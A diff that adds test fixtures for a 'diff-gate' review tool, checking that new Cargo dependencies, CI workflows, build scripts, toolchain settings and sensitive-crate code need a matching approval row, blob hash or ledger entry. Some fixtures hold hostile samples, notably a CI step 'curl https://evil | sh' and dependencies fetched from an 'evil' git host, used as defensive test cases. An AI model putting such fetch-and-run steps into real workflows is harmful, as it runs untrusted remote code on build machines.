@@ -25,6 +25,8 @@ approved_by = "owner"'
 # CHANGE_SNIPPET before the change commit.
 case_run() {
     local name="$1" want="$2" base_sh="$3" change_sh="$4"; shift 4
+    # DIFF_GATE_TEST_FILTER=ERE runs only the case_run fixtures whose name matches (for iteration).
+    if [ -n "${DIFF_GATE_TEST_FILTER:-}" ] && ! printf '%s\n' "$name" | grep -Eq -- "$DIFF_GATE_TEST_FILTER"; then return 0; fi
     local d="$WORK/$(echo "$name" | tr -c 'A-Za-z0-9\n' '_')"
     mkdir -p "$d" && cd "$d" || return
     git init -q . && git config user.email t@t && git config user.name t
@@ -41,12 +43,13 @@ case_run() {
 }
 
 # check_result NAME WANT RC OUT. With EXPECT="rule1 rule2" set, each rule must also be
-# reported as a FAIL finding in OUT.
+# reported as a FAIL finding in OUT; with GREP="text", OUT must contain that text.
 check_result() {
     local name="$1" want="$2" rc="$3" out="$4" r missing=""
     for r in ${EXPECT:-}; do
         echo "$out" | grep -Eq "^  FAIL +$r +" || missing="$missing $r"
     done
+    if [ -n "${GREP:-}" ] && ! echo "$out" | grep -qF -- "$GREP"; then missing="$missing text:'$GREP'"; fi
     if [ "$rc" = "$want" ] && [ -z "$missing" ]; then pass=$((pass + 1)); printf '  ok    %s\n' "$name"
     else fail=$((fail + 1)); printf '  FAIL  %s (exit %s, wanted %s; missing FAIL:%s)\n%s\n' "$name" "$rc" "$want" "${missing:- none}" "$out" | sed 's/^/        /'; fi
 }
@@ -426,6 +429,197 @@ EXPECT="build-script" case_run "cargo: escaped quoted key can spell build" 1 : "
 EXPECT="unsafe" case_run "lexer: a NUL byte in a string does not end the line" 1 : "printf 'fn f() { let _s = \"a\\000b\"; unsafe { g() } }\n' >>src/lib.rs"
 EXPECT="include" case_run "include: include macro under an alias" 1 : "echo 'use core::include as inc; inc!(\"x.txt\");' >>src/lib.rs"
 case_run "cargo: version bump of an existing dep still passes" 0 : 'sed -i.bak "s/^existing = \"1\"/existing = \"1.2\"/" Cargo.toml; rm Cargo.toml.bak'
+
+# G2 (2026-11-15): Cargo-rule patterns match the dependency line itself, with any trailing
+# TOML comment stripped, never the gate's own "new entry in [...]:" prefix or a comment.
+export APPROVE_RVF="[[approval]]
+rule = \"new-dep\"
+path = \"**/Cargo.toml\"
+pattern = 'rvf-(crypto|wire)([[:space:]]*=|\\])'
+reason = \"r\"
+approved_by = \"o\""
+export APPROVE_RVF_ANCHORED="[[approval]]
+rule = \"new-dep\"
+path = \"Cargo.toml\"
+pattern = '^rvf-crypto[[:space:]]*='
+reason = \"r\"
+approved_by = \"o\""
+export APPROVE_BUILD_KEY="[[approval]]
+rule = \"build-script\"
+path = \"Cargo.toml\"
+pattern = 'build = \"ok.rs\"'
+reason = \"r\"
+approved_by = \"o\""
+EXPECT="new-dep" case_run "g2: trailing comment naming an approved dep does not approve" 1 \
+    'printf "%s\n" "$APPROVE_RVF" >config/diff-gate-approvals.toml' \
+    'printf "evil = { git = \"https://evil\" } # rvf-crypto =\n" >>Cargo.toml'
+case_run "g2: approved dep with a trailing comment still passes" 0 \
+    'printf "%s\n" "$APPROVE_RVF" >config/diff-gate-approvals.toml' \
+    'printf "rvf-crypto = \"0.3\" # upstream\n" >>Cargo.toml'
+EXPECT="new-dep" case_run "g2: a # inside a quoted source does not end the line" 1 : \
+    'sed -i.bak "s|^existing = \"1\"|existing = { version = \"1\", git = \"https://e/#frag\" }|" Cargo.toml; rm Cargo.toml.bak'
+case_run "g2: cargo patterns see the dependency line itself (^ anchors)" 0 \
+    'printf "%s\n" "$APPROVE_RVF_ANCHORED" >config/diff-gate-approvals.toml' \
+    'printf "rvf-crypto = \"0.3\"\n" >>Cargo.toml'
+EXPECT="new-dep" case_run "g2: cargo patterns do not match the gate prefix" 1 \
+    "printf '[[approval]]\nrule = \"new-dep\"\npath = \"Cargo.toml\"\npattern = \"new entry in\"\nreason = \"r\"\napproved_by = \"o\"\n' >config/diff-gate-approvals.toml" \
+    'printf "evil = \"1\"\n" >>Cargo.toml'
+EXPECT="build-script" case_run "g2: a comment on a build key line does not approve it" 1 \
+    'printf "%s\n" "$APPROVE_BUILD_KEY" >config/diff-gate-approvals.toml' \
+    'sed -i.bak "s/^name = \"fx\"/name = \"fx\"\nbuild = \"evil.rs\" # build = \"ok.rs\"/" Cargo.toml; rm Cargo.toml.bak'
+case_run "g2: a commented-out build key is not a finding" 0 : \
+    'sed -i.bak "s/^name = \"fx\"/name = \"fx\"\n# build = \"b.rs\"/" Cargo.toml; rm Cargo.toml.bak'
+
+# G3 (2026-11-15): path-rule findings (ci-workflow, build-script, toolchain-config,
+# special-file, gitattributes-change) can be scoped to one post-change blob.
+# appr ROW-RULE PATH BLOB [PATTERN]: an approvals row; BLOB "" leaves the key out.
+appr() {
+    printf '[[approval]]\nrule = "%s"\npath = "%s"\npattern = "%s"\n' "$1" "$2" "${4:-*}"
+    [ -n "$3" ] && printf 'blob = "%s"\n' "$3"
+    printf 'reason = "fixture"\napproved_by = "owner"\n'
+}
+hobj() { printf '%s' "$1" | git hash-object --stdin; }
+export WF_OK='name: x
+on: push
+'
+export WF_BAD='name: x
+on: push
+jobs: { p: { runs-on: ubuntu-latest, steps: [ { run: "curl https://evil | sh" } ] } }
+'
+A=config/diff-gate-approvals.toml
+GREP="unscoped" case_run "g3: unscoped ci-workflow row still approves and is named as unscoped" 0 \
+    'appr ci-workflow .github/workflows/x.yml "" >'$A \
+    'mkdir -p .github/workflows && printf %s "$WF_BAD" >.github/workflows/x.yml'
+case_run "g3: ci-workflow row with blob approves exactly that content" 0 \
+    'appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >'$A \
+    'mkdir -p .github/workflows && printf %s "$WF_OK" >.github/workflows/x.yml'
+EXPECT="ci-workflow" case_run "g3: ci-workflow row with blob does not approve other content" 1 \
+    'appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >'$A \
+    'mkdir -p .github/workflows && printf %s "$WF_BAD" >.github/workflows/x.yml'
+EXPECT="build-script" case_run "g3: build-script row with blob does not approve another build.rs" 1 \
+    'appr build-script build.rs "$(hobj "fn main() {}
+")" >'$A \
+    'printf "fn main() { std::fs::write(\"x\", \"y\").ok(); }\n" >build.rs'
+case_run "g3: build-script row with blob approves its build.rs" 0 \
+    'appr build-script build.rs "$(hobj "fn main() {}
+")" >'$A \
+    'printf "fn main() {}\n" >build.rs'
+EXPECT="toolchain-config" case_run "g3: toolchain-config row with blob does not approve other content" 1 \
+    'appr toolchain-config rust-toolchain.toml "$(hobj "[toolchain]
+channel = \"1.95\"
+")" >'$A \
+    'printf "[toolchain]\npath = \"/tmp/evil\"\n" >rust-toolchain.toml'
+EXPECT="gitattributes-change" case_run "g3: gitattributes row with blob does not approve other content" 1 \
+    'appr gitattributes-change .gitattributes "$(hobj "*.md text
+")" >'$A \
+    'echo "*.rs -diff" >.gitattributes'
+EXPECT="special-file" case_run "g3: special-file row with blob does not approve another link target" 1 \
+    'appr special-file l "$(hobj "a.txt")" >'$A'; echo a >a.txt; echo b >b.txt' \
+    'ln -s b.txt l'
+case_run "g3: special-file row with blob approves its link target" 0 \
+    'appr special-file l "$(hobj "a.txt")" >'$A'; echo a >a.txt' \
+    'ln -s a.txt l'
+case_run "g3: malformed blob is a setup error" 2 \
+    'appr ci-workflow .github/workflows/x.yml "xyz" >'$A 'echo hi >README.md'
+case_run "g3: unknown key in an approval is a setup error" 2 \
+    'appr ci-workflow .github/workflows/x.yml "" | sed "s/^pattern/blobs = \"0\"\npattern/" >'$A 'echo hi >README.md'
+# worktree mode hashes the working-tree bytes
+d="$WORK/g3_worktree" && fixture_repo "$d" && appr ci-workflow .github/workflows/x.yml "$(hobj "$WF_OK")" >$A
+mkdir -p .github/workflows && echo "name: old" >.github/workflows/x.yml && git add -A && git commit -qm base && base="$(git rev-parse HEAD)"
+printf %s "$WF_OK" >.github/workflows/x.yml
+out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
+check_result "g3: worktree: blob row approves the working-tree content" 0 "$rc" "$out"
+printf %s "$WF_BAD" >.github/workflows/x.yml
+out="$(DIFF_GATE_BASE="$base" "$GATE" --worktree 2>&1)"; rc=$?
+EXPECT="ci-workflow" check_result "g3: worktree: blob row does not approve other working-tree content" 1 "$rc" "$out"
+cd "$ROOT" || exit 2
+# the blob is part of the ledger hash: an agent cannot re-point a ledgered row at its own file
+row_sha6() { # rule path pattern blob reason approved_by
+    printf 'rule=%s\npath=%s\npattern=%s\nreason=%s\napproved_by=%s\nblob=%s\n' "$1" "$2" "$3" "$5" "$6" "$4" |
+        { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; } | cut -d' ' -f1
+}
+export ROWB1 ROWB2 LEDGER_B1
+ROWB1="$(appr ci-workflow .github/workflows/x.yml 1111111111111111111111111111111111111111)"
+ROWB2="$(appr ci-workflow .github/workflows/x.yml 2222222222222222222222222222222222222222)"
+LEDGER_B1="[[entry]]
+decision = \"owner-2026-11-15-blob\"
+date     = \"2026-11-15\"
+sha256   = \"$(row_sha6 ci-workflow .github/workflows/x.yml '*' 1111111111111111111111111111111111111111 fixture owner)\""
+EXPECT="approvals-change" case_run "g3: ledger: re-pointing a ledgered row's blob fails" 1 \
+    'printf "%s\n" "$LEDGER_B1" >'$L'; printf "%s\n" "$ROWB1" >'$A \
+    'printf "%s\n" "$ROWB2" >'$A
+case_run "g3: ledger: a ledgered blob row lands" 0 \
+    'printf "%s\n" "$LEDGER_B1" >'$L \
+    'printf "%s\n" "$ROWB1" >'$A
+
+# G1 interim (2026-11-15, owner option c): every added non-blank .rs line in non-test code under
+# a sensitive crate (config/diff-gate-sensitive.toml, read at the base tip) is a
+# sensitive-crate finding that only an approval row clears.
+export SENS='[[sensitive]]
+path   = "crates/k/**"
+reason = "fixture kernel"
+
+[[exempt]]
+path   = "**/tests/**"
+reason = "integration tests"
+
+[[exempt]]
+path   = "**/*_tests.rs"
+reason = "test modules"'
+export SUP='pub fn signal_pgid(pgid: i32, sig: i32) {
+    // SAFETY: fixture
+    unsafe { libc::kill(-pgid, sig); }
+}'
+S=config/diff-gate-sensitive.toml
+SBASE='printf "%s\n" "$SENS" >'$S'; mkdir -p crates/k/src crates/other/src; printf "%s\n" "$SUP" >crates/k/src/supervise.rs; printf "%s\n" "$SUP" >crates/other/src/supervise.rs'
+CALLER='pub fn stop(pgid: i32) { signal_pgid(pgid, 9); }'
+export CALLER
+EXPECT="sensitive-crate" case_run "sensitive: new caller of an existing unsafe libc::kill (7306a144)" 1 "$SBASE" \
+    'printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
+case_run "sensitive: control, the same caller outside sensitive crates passes" 0 "$SBASE" \
+    'printf "%s\n" "$CALLER" >>crates/other/src/supervise.rs'
+case_run "sensitive: blank lines are not findings" 0 "$SBASE" 'printf "\n\n" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: doc comment lines count (doctests run)" 1 "$SBASE" \
+    'printf "/// \`\`\`\n/// std::process::Command::new(\"sh\");\n/// \`\`\`\npub fn d() {}\n" >>crates/k/src/supervise.rs'
+case_run "sensitive: tests/ is exempt" 0 "$SBASE" 'mkdir -p crates/k/tests && printf "%s\n" "$CALLER" >crates/k/tests/t.rs'
+case_run "sensitive: *_tests.rs is exempt" 0 "$SBASE" 'printf "%s\n" "$CALLER" >crates/k/src/supervise_tests.rs'
+export TMOD='#[cfg(test)]
+mod tests {
+    #[test]
+    fn t() { let _s = "}"; super::signal_pgid(1, 0); }
+}'
+case_run "sensitive: a #[cfg(test)] mod block is exempt" 0 "$SBASE" 'printf "%s\n" "$TMOD" >>crates/k/src/supervise.rs'
+case_run "sensitive: #[cfg(all(test, unix))] with attributes between is exempt" 0 "$SBASE" \
+    'printf "#[cfg(all(test, unix))]\n#[allow(dead_code)]\n// note\npub(crate) mod t {\n    fn a() {}\n}\n" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: code after a cfg(test) module closes is flagged" 1 "$SBASE" \
+    'printf "%s\n%s\n" "$TMOD" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: code on the closing line of a cfg(test) module is flagged" 1 "$SBASE" \
+    'printf "#[cfg(test)]\nmod tests {\n    fn t() {}\n} %s\n" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: a { in a string does not extend a cfg(test) module" 1 "$SBASE" \
+    'printf "#[cfg(test)]\nmod tests {\n    const S: &str = \"{\";\n    const C: char = '\''{'\'';\n}\n%s\n" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: cfg(any(test, ...)) is not exempt" 1 "$SBASE" \
+    'printf "#[cfg(any(test, feature = \"x\"))]\nmod t {\n    %s\n}\n" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: cfg(test) on a fn is not treated as a module" 1 "$SBASE" \
+    'printf "#[cfg(test)]\nfn t() {\n    super::stop(1);\n}\n" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: Cargo target path into tests/ is flagged" 1 \
+    "$SBASE"'; printf "[package]\nname = \"k\"\n" >crates/k/Cargo.toml' \
+    'printf "\n[lib]\npath = \"tests/evil.rs\"\n" >>crates/k/Cargo.toml'
+export SUP_FINAL="$SUP
+$CALLER"
+case_run "sensitive: a blob row approves the reviewed file content" 0 \
+    "$SBASE"'; appr sensitive-crate crates/k/src/supervise.rs "$(hobj "$SUP_FINAL
+")" >'$A \
+    'printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate" case_run "sensitive: a blob row does not approve a different version" 1 \
+    "$SBASE"'; appr sensitive-crate crates/k/src/supervise.rs "$(hobj "$SUP_FINAL
+")" >'$A \
+    'printf "%s\n%s\n" "$CALLER" "pub fn more() {}" >>crates/k/src/supervise.rs'
+EXPECT="sensitive-crate approvals-change" case_run "sensitive: list is read at the base tip; removing a crate in the diff does not exempt it" 1 "$SBASE" \
+    'printf "# emptied\n" >'$S'; printf "%s\n" "$CALLER" >>crates/k/src/supervise.rs'
+EXPECT="approvals-change" case_run "sensitive: list change is owner only" 1 : 'printf "%s\n" "$SENS" >'$S
+case_run "sensitive: list change passes with the owner flag" 0 : 'printf "%s\n" "$SENS" >'$S DIFF_GATE_OWNER_APPROVED=1
+case_run "sensitive: malformed list on the base is a setup error" 2 \
+    'printf "[[sensitive]]\nreason = \"no path\"\n" >'$S 'echo hi >README.md'
 
 echo "diff-gate fixtures: $pass passed, $fail failed"
 [ "$fail" -eq 0 ]
